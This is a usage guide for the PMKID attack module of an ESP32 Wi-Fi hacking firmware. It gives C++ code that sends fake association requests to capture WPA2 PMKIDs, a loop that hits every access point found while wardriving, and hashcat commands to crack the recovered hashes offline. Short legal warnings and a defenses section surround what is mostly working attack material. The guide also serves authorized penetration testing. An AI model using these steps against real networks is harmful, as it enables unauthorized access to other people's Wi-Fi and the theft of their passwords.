# Sniffy Boi - PMKID Attack Guide

## ⚠️ LEGAL WARNING

**THIS MODULE IS FOR AUTHORIZED USE ONLY**

PMKID attacks require the same legal authorization as handshake capture. See `DEAUTH_ATTACK_GUIDE.md` for full legal warnings.

---

## 🎯 What is PMKID?

**PMKID** (Pairwise Master Key Identifier) is a newer WPA2 attack method discovered in 2018. It's **simpler and faster** than traditional 4-way handshake capture.

### Key Advantages
- ✅ **Only needs M1** - Not the full 4-way handshake
- ✅ **Clientless attack** - No real clients required!
- ✅ **Faster capture** - ~1 second vs 5-10 seconds
- ✅ **Works passively** - Can capture from normal client connections
- ✅ **Same cracking method** - Hashcat mode 22000

### How PMKID Works

**PMKID Formula:**
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```

Where:
- **PMK** = Pairwise Master Key (derived from WiFi password)
- **MAC_AP** = Access Point BSSID
- **MAC_STA** = Client MAC address
- **"PMK Name"** = Literal string constant

The PMKID is included in the **RSN Information Element** of EAPOL Message 1 (M1), which is sent by the AP when a client connects.

**Since the PMKID is derived from the PMK (which comes from the password), we can crack it offline just like handshakes!**

---

## 🔥 Attack Modes

### Mode 1: Passive Capture

Wait for real clients to connect to the AP. When they do, the AP sends M1 with PMKID.

**Advantages:**
- Completely passive (no packets sent)
- Undetectable by the AP or clients
- No risk of disrupting the network

**Disadvantages:**
- Requires waiting for client connections
- May take minutes/hours on quiet networks

**Usage:**
```cpp
pmkid->beginPassive();

// Wait for client connections...
// PMKIDs will be captured automatically
```

---

### Mode 2: Clientless Attack (RECOMMENDED)

Send **fake association requests** to the AP pretending to be a client. The AP responds with M1 containing PMKID, even though you're not a real client!

**Advantages:**
- ✅ **No real clients needed!**
- ✅ **Works on empty networks**
- ✅ **Fast** (1-2 seconds per AP)
- ✅ **Can attack multiple APs rapidly**

**Disadvantages:**
- Sends packets (detectable if someone is monitoring)
- Some APs may not respond to association requests

**Usage:**
```cpp
uint8_t ap_mac[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
String ssid = "TargetWiFi";

pmkid->sendAssociationRequest(ap_mac, ssid);

// Wait 1-2 seconds for M1 response with PMKID
```

---

## 🛠️ Implementation Details

### PMKID Location in EAPOL M1

```
EAPOL M1 Frame Structure:
├─ EAPOL Header (4 bytes)
├─ Key Descriptor Type (1 byte)
├─ Key Information (2 bytes)
├─ Key Length (2 bytes)
├─ Replay Counter (8 bytes)
├─ Key Nonce (ANonce) (32 bytes)
├─ Key IV (16 bytes)
├─ Key RSC (8 bytes)
├─ Key ID (8 bytes)
├─ Key MIC (16 bytes) - all zeros in M1
├─ Key Data Length (2 bytes)
└─ Key Data (variable)
    └─ RSN Information Elements
        └─ PMKID KDE (Key Data Encapsulation)
            ├─ Tag: 0xDD (Vendor Specific)
            ├─ Length: 0x14 (20 bytes)
            ├─ OUI: 0x00 0x0F 0xAC (WiFi Alliance)
            ├─ Type: 0x04 (PMKID)
            └─ PMKID: 16 bytes ← THIS IS WHAT WE WANT
```

### Extraction Algorithm

```cpp
1. Parse EAPOL M1 frame
2. Navigate to Key Data field (offset 102)
3. Search for Vendor Specific IE (tag 0xDD)
4. Check OUI = 00:0F:AC (WiFi Alliance)
5. Check Type = 0x04 (PMKID KDE)
6. Extract 16 bytes of PMKID
7. Store: AP MAC + Client MAC + PMKID + SSID
```

---

## 📡 Clientless Attack Deep Dive

### Association Request Frame

When we send an association request, we're pretending to be a legitimate client trying to connect:

```
802.11 Association Request:
├─ Frame Control (Type=Management, Subtype=Assoc Req)
├─ Destination: AP MAC
├─ Source: Fake Client MAC (randomly generated)
├─ BSSID: AP MAC
├─ Association Request Body:
    ├─ Capability Info (supports ESS)
    ├─ Listen Interval
    ├─ SSID IE (target network name)
    ├─ Supported Rates IE
    └─ RSN IE (WPA2 capabilities) ← CRITICAL!
```

**Why RSN IE is critical:**
- The RSN IE tells the AP we support WPA2
- This triggers the AP to include PMKID in M1 response
- Without RSN IE, AP won't send PMKID!

### Fake MAC Generation

We generate a random locally-administered MAC address:
```cpp
MAC[0] = 0x02 | (random & 0xFC)  // Bit 1 set = locally administered
MAC[1-5] = random bytes
```

**Why locally-administered?**
- Bit 1 = 1 means "locally administered" (not assigned by IEEE)
- Reduces chance of MAC collision with real devices
- Clearly identifies our fake clients

---

## 🎮 Usage Examples

### Example 1: Passive PMKID Capture

```cpp
#include "PMKIDCapture.h"

PMKIDCapture* pmkid = new PMKIDCapture();

void setup() {
    // Start passive capture
    pmkid->beginPassive();

    // Also enable packet sniffing to receive EAPOL frames
    sniffer->begin(6);  // Channel 6
}

void loop() {
    // PMKIDs will be captured automatically when clients connect
    // Check captured PMKIDs:
    if (pmkid->getPMKIDCount() > 0) {
        pmkid->printSummary();
    }
}

// When M1 is received (from PacketSniffer):
// PMKIDCapture::processEAPOL_M1() is called automatically

// Output when PMKID captured:
// ╔════════════════════════════════════════════════════════════╗
// ║            ★★★ PMKID CAPTURED! ★★★                       ║
// ╚════════════════════════════════════════════════════════════╝
//   SSID:     MyHomeWiFi
//   AP:       AA:BB:CC:DD:EE:FF
//   Client:   11:22:33:44:55:66
//   Channel:  6
//   RSSI:     -45 dBm
//   PMKID:    A1B2C3D4E5F6789ABCDEF0123456789A
// ════════════════════════════════════════════════════════════
// ✓ Ready for hashcat cracking (mode 22000)
```

---

### Example 2: Clientless Attack (Single AP)

```cpp
// Target a specific AP without waiting for clients

uint8_t target_ap[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
String ssid = "TargetNetwork";

// Send association request (fake client)
pmkid->sendAssociationRequest(target_ap, ssid);

// Output:
// ╔════════════════════════════════════════════════════════════╗
// ║       CLIENTLESS PMKID ATTACK (Association Request)       ║
// ╚════════════════════════════════════════════════════════════╝
//   Target AP:  AA:BB:CC:DD:EE:FF
//   SSID:       TargetNetwork
//   Fake STA:   02:A4:6F:3E:21:C9
// ════════════════════════════════════════════════════════════
// ✓ Association request sent
// → Waiting for M1 with PMKID (should arrive within 1-2 seconds)...

// Wait 1-2 seconds...

// ╔════════════════════════════════════════════════════════════╗
// ║            ★★★ PMKID CAPTURED! ★★★                       ║
// ╚════════════════════════════════════════════════════════════╝
//   SSID:     TargetNetwork
//   AP:       AA:BB:CC:DD:EE:FF
//   Client:   02:A4:6F:3E:21:C9 (fake/clientless)
//   PMKID:    3F8A29D1B4C5E7F890A1B2C3D4E5F678
```

---

### Example 3: Attack All APs on Channel

```cpp
// Scan for APs, then attack each one

// 1. Scan for beacons
sniffer->begin(6);
delay(5000);  // Scan for 5 seconds

// 2. Get discovered APs
auto& devices = sniffer->getDevices();

// 3. Attack each AP
for (auto& device : devices) {
    if (device.second.is_ap) {
        Serial.printf("Attacking AP: %s (%s)\n",
                      device.second.ssid.c_str(),
                      device.second.mac_str.c_str());

        pmkid->sendAssociationRequest(device.second.mac, device.second.ssid);
        delay(2000);  // Wait for M1 response
    }
}

// 4. Print captured PMKIDs
pmkid->printSummary();
```

---

## 🔓 Hashcat Cracking

### Export Format

**Hashcat 22000 format for PMKID:**
```
WPA*01*PMKID*AP_MAC*STA_MAC*SSID_HEX
```

**Example:**
```cpp
String hash = pmkid->exportHashcat(pmkid_info);
// Output:
// WPA*01*A1B2C3D4E5F6789ABCDEF0123456789A*AABBCCDDEEFF*112233445566*4D79486F6D6557694669
```

### Cracking with Hashcat

**Step 1: Export PMKID**
```cpp
// Print all PMKIDs in hashcat format
for (const auto& pmkid_info : pmkid->getPMKIDs()) {
    Serial.println(pmkid->exportHashcat(pmkid_info));
}
```

**Step 2: Save to file**
```bash
# From serial monitor, copy the hash line
echo "WPA*01*A1B2..." > pmkid.22000
```

**Step 3: Crack**
```bash
# Wordlist attack
hashcat -m 22000 pmkid.22000 rockyou.txt

# With rules
hashcat -m 22000 pmkid.22000 rockyou.txt -r best64.rule

# Brute force 8 digits
hashcat -m 22000 pmkid.22000 -a 3 ?d?d?d?d?d?d?d?d

# Mask attack (common patterns)
hashcat -m 22000 pmkid.22000 -a 3 ?u?l?l?l?l?d?d?d  # Password123

# GPU acceleration
hashcat -m 22000 -d 1 pmkid.22000 wordlist.txt
```

---

## 📊 PMKID vs Handshake Capture

| Feature | PMKID | Full Handshake |
|---------|-------|----------------|
| **Messages needed** | M1 only | M1 + M2 (or M2 + M3) |
| **Requires clients** | No (clientless) | Yes |
| **Capture time** | 1-2 seconds | 5-10 seconds |
| **Deauth needed** | No | Usually yes |
| **Success rate** | ~70% of APs | ~95% of APs |
| **Hashcat mode** | 22000 | 22000 (same!) |
| **Cracking speed** | Identical | Identical |
| **Defenses** | 802.11w, WPA3 | 802.11w, WPA3 |

**When to use PMKID:**
- ✅ No clients connected to AP
- ✅ Want fast, stealthy capture
- ✅ Testing multiple APs quickly

**When to use Handshake:**
- ✅ PMKID not available (some APs don't send it)
- ✅ Want maximum success rate
- ✅ 802.11w is disabled (handshake still works)

**Pro tip:** Use **both methods** for maximum coverage!

---

## 🛡️ Defenses Against PMKID

### For Network Administrators

**1. Disable PMKID in AP Configuration**
Some APs allow disabling PMKID KDE in M1:
- Check AP firmware settings
- May be labeled "Disable roaming features"
- Not all APs support this option

**2. Enable 802.11w (PMF)**
Protected Management Frames encrypt management frames:
- Prevents fake association requests
- Requires WPA3 or WPA2 with PMF enabled
- Not all clients support PMF

**3. Upgrade to WPA3**
WPA3 uses SAE (Simultaneous Authentication of Equals):
- No PMKID in SAE handshake
- Forward secrecy protection
- Resistant to offline dictionary attacks

**4. Monitor for Fake Association Requests**
Wireless IDS can detect:
- Association requests from unknown MACs
- Rapid association requests (multiple per second)
- Locally-administered MAC addresses

---

## 🔍 Troubleshooting

### No PMKID Captured

**Symptom:** Association request sent, but no PMKID received

**Possible Causes:**

1. **AP doesn't support PMKID**
   - Some older APs don't include PMKID in M1
   - Try different APs or use handshake capture instead

2. **Wrong channel**
   - Ensure sniffer is on same channel as AP
   - Lock channel before sending association request

3. **AP ignored association request**
   - Some APs filter association requests
   - Try different fake MAC addresses
   - Ensure RSN IE is included in request

4. **802.11w (PMF) enabled**
   - Protected Management Frames encrypt/reject fake associations
   - Target older WPA2 networks without PMF

5. **WPA3-only network**
   - WPA3 doesn't use PMKID
   - Check AP capabilities (look for WPA2 support)

---

### Association Request Failed

**Symptom:**
```
✗ Failed to send association request (error X)
```

**Solutions:**
- Check WiFi is initialized (`esp_wifi_init()`)
- Ensure promiscuous mode is enabled
- Verify channel is valid (1-13)
- Try increasing TX power (future feature)

---

### Rate Limited

**Symptom:**
```
[PMKID] Rate limited - wait 500ms between association requests
```

**Solution:**
- Wait 500ms between `sendAssociationRequest()` calls
- Rate limit prevents AP from blocking our MAC
- Also prevents ESP32 firmware crashes

---

## 💾 Memory Usage

**Per PMKID captured:**
- AP MAC: 6 bytes
- STA MAC: 6 bytes
- PMKID: 16 bytes
- SSID: ~32 bytes (variable)
- Metadata: ~20 bytes
- **Total: ~80 bytes per PMKID**

**With 283KB free RAM:**
- Can store ~3,500 PMKIDs before RAM full
- Realistic wardriving: 50-200 PMKIDs
- **Plenty of headroom**

**Flash overhead:**
- PMKID module: **460 bytes** total
- Minimal impact on firmware size

---

## 🎯 Best Practices

### 1. Channel Locking

```cpp
// Lock to target channel BEFORE attacking
sniffer->setChannel(6);

// Send association request
pmkid->sendAssociationRequest(ap_mac, ssid);

// Don't hop channels for 2-3 seconds!
```

**Why:** If you hop away before M1 arrives, you'll miss the PMKID.

---

### 2. Wait for Response

```cpp
// Send association request
pmkid->sendAssociationRequest(ap_mac, ssid);

// Wait for M1 (usually 100ms - 2 seconds)
delay(2000);

// Check if PMKID captured
if (pmkid->getPMKIDCount() > 0) {
    Serial.println("Got PMKID!");
}
```

---

### 3. Combine with Passive Scan

```cpp
// 1. Passive scan to discover APs
sniffer->begin(6);
delay(10000);  // Scan for 10 seconds

// 2. Attack each discovered AP
auto& devices = sniffer->getDevices();
for (auto& dev : devices) {
    if (dev.second.is_ap) {
        pmkid->sendAssociationRequest(dev.second.mac, dev.second.ssid);
        delay(2000);
    }
}

// 3. Export all captured PMKIDs
for (const auto& p : pmkid->getPMKIDs()) {
    Serial.println(pmkid->exportHashcat(p));
}
```

---

### 4. Verify SSID

```cpp
// Include SSID in association request for higher success rate
pmkid->sendAssociationRequest(ap_mac, "TargetNetwork");

// Empty SSID = broadcast association (may not work on all APs)
// pmkid->sendAssociationRequest(ap_mac, "");  // Less reliable
```

---

## 🚀 Advanced Techniques

### Wardriving with PMKID

```cpp
// Channel hopping + PMKID attack loop
for (uint8_t ch = 1; ch <= 13; ch++) {
    sniffer->setChannel(ch);
    Serial.printf("Channel %u\n", ch);

    // Scan for APs
    delay(3000);

    // Attack each AP
    auto& devices = sniffer->getDevices();
    for (auto& dev : devices) {
        if (dev.second.is_ap) {
            pmkid->sendAssociationRequest(dev.second.mac, dev.second.ssid);
            delay(2000);
        }
    }
}

// Export all PMKIDs to serial/SD card
pmkid->printSummary();
```

---

### Combined PMKID + Handshake Strategy

```cpp
// Try PMKID first (fast), fallback to handshake if needed

// 1. PMKID attack
pmkid->sendAssociationRequest(ap_mac, ssid);
delay(2000);

// 2. Check if PMKID captured
if (pmkid->getPMKIDCount() == 0) {
    // PMKID failed, try handshake
    Serial.println("PMKID failed, trying handshake...");
    sniffer->triggerHandshake(ap_mac, client_mac, 5);
} else {
    Serial.println("PMKID captured! Skipping handshake.");
}
```

---

## 📝 Summary

**PMKID Module Features:**
- ✅ Passive PMKID capture (monitor M1 frames)
- ✅ Clientless attack (fake association requests)
- ✅ Hashcat 22000 export format
- ✅ Automatic PMKID extraction from RSN IE
- ✅ Fake MAC generation (locally-administered)
- ✅ Rate limiting (500ms between associations)
- ✅ Minimal overhead (460 bytes flash, ~80 bytes RAM per PMKID)

**Success Rate:**
- ~70% of WPA2 APs support PMKID
- ~30% don't include PMKID in M1 (use handshake instead)
- 100% compatibility with hashcat mode 22000

**Use responsibly. Authorization required.**

---

**Happy (authorized) PMKID hunting!** 🎯
